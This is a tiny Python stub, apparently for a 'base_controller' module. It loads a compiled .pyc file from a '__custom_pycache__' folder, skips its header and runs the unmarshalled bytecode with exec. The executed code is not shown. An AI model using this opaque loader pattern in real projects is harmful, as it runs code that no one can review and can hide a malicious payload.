
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'base_controller_cff79f4211ce4855877c7b135bea626e.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
